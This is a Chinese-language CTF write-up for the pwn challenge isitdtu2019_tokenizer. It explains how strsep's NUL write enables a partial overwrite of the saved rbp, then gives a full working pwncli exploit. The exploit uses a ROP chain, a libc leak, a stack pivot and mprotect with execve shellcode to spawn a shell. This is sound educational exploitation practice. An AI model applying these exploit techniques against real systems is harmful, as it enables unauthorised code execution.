# BUUCTF-isitdtu2019_tokenizer



### 总结

考察`strsep`函数，查看其源码可知，该函数签名为：`char * __strsep (char **stringp, const char *delim)`，其中`*stringp`这个字符串会被修改。每当`*stringp`所指向的字符串含有分割符的时候，会将此处置为`\0`。也就是说，会改变原有字符串的值（可以执行某一位置置为`\0`）。

<!-- more -->

### checksec

![image-20220411232737883](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220411232737883.png)

远程为`libc-2.23.so`。

### 漏洞点

漏洞点在`strsep`函数：

```c
char *
__strsep (char **stringp, const char *delim)
{
  char *begin, *end;

  begin = *stringp;
  if (begin == NULL)
    return NULL;

  /* Find the end of the token.  */
  end = begin + strcspn (begin, delim);

  if (*end)
    {
      /* Terminate the token and set *STRINGP past NUL character.  */
      *end++ = '\0'; // 这里会置为\0
      *stringp = end;
    }
  else
    /* No more delimiters; this is the last token.  */
    *stringp = NULL;

  return begin;
}
```

对`*end`指向的内容有修改。

![image-20220411232917698](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220411232917698.png)

这里拷贝结束后，刚好挨着`rbp`寄存器指向的值。

### 利用思路

- 利用`strncpy`输入`0x400`个字节即可泄露出`rbp`存储的栈地址
- 将分隔符设置为泄露出的栈地址的最后一个字节，如为`0xf0`，就设置分割字符串为`"\xf0\x00"`，这样就会修改`rbp`链的值
- 函数返回的时候，由于`leave; ret`，实际返回到栈的低地址处，这就到了输入的可控空间，需要注意的是，泄露出栈地址的最后一个字节一定是`0x?0`，有`16`中可能，每一种最后需要控制的偏移都不一样，但是有规律，总结后发现：当最后一个字节为`0xf0`的时候，需要控制的偏移处为`0x330`；当最后一个字节为`0xe0`的时候，需要控制的偏移为`0x340`......当最后一个字节为`0x30`的时候，需要控制的偏移为`0x3f0`。也就是说，如果泄露出来的栈地址的最后一个字节为`0xf0`，填入的`payload`应该为：`a * 0x330 + rbp + ret + ······`
- 我选择爆破最后一个字节为`0xb0`，输入`rop`链（`rop`中的`\x00`都可以用`\xb0`代替，这样在`strsep`的时候，就把这些`\xb0`给置为`\x00`了），`rop`链分别调用`stdout`泄露出`glibc`地址，然后伪造一个`std::string`对象，往`bss`段上输入，最后栈迁移到`bss`然后调用`gets`继续输入，执行`mprotect+shellcode`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

payload = b"a"*0x370

fake_rbp = 0x404280
val = 0xb0
payload += p32_ex(fake_rbp+0x20)[:3]+p8(val) * 5
payload += p32_ex(0x40149b)[:3]+p8(val) * 5 # pop rdi
payload += p32_ex(0x404020)[:3]+p8(val) * 5
payload += p32_ex(0x401499)[:3]+p8(val) * 5 # pop rsi
payload += p32_ex(0x403f98)[:3]+p8(val) * 5
payload += p32_ex(0x403f98)[:3]+p8(val) * 5
payload += p32_ex(0x401080)[:3]+p8(val) * 5 # leak
payload += p32_ex(0x40149b)[:3]+p8(val) * 5 # pop rdi
payload += p32_ex(0x404140)[:3]+p8(val) * 5 # cin
payload += p32_ex(0x401499)[:3]+p8(val) * 5 # pop rsi
payload += p32_ex(fake_rbp+0x18)[:3]+p8(val) * 5
payload += p32_ex(fake_rbp+0x18)[:3]+p8(val) * 5
payload += p32_ex(0x401030)[:3]+p8(val) * 5 # read
payload += p32_ex(0x40149b)[:3]+p8(val) * 5 # pop rdi
payload += p32_ex(fake_rbp)[:3]+p8(val) * 5 # 
payload += p32_ex(0x40125f)[:3]+p8(val) * 5 # leave ret

payload=  payload.ljust(0x3f0, b"a")

payload += b"deadbeef" * 2
sla("Please input string (will be truncated to 1024 characters): ", payload)
ru(b"deadbeef" * 2)
m = rl()
rbp_val = u64_ex(m[:-1])
log_address("rbp_val", rbp_val)

assert (rbp_val & 0xff) in (0xb0, ), "try again!"

sla("Please input delimiters: ", p8_ex(rbp_val)+b"\x00"*7 + p64(0x4042a8))
io.recvuntil(b"deadbeef" * 2, timeout=4)

m = io.recv(timeout=4)

set_current_libc_base_and_log(u64_ex(m[-6:]), 0x9f1b0)
# stop()
sl(p64(libc.sym.gets)[:6])

sleep(1)
rop = ROP(libc, base = libc.address)
rop.mprotect(fake_rbp&~0xfff, 0x1000, 7)
rop.call(fake_rbp+0x80)
rop.raw(b"\x90"*0x100 + ShellcodeMall.amd64.execve_bin_sh)

sl(flat({0x10: rop.chain()}))

ia()
```

远程爆破一下就好，运气很好，第一次就成功了：

![image-20220411234013931](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220411234013931.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-04-11-buuctf-isitdtu2019-tokenizer/  

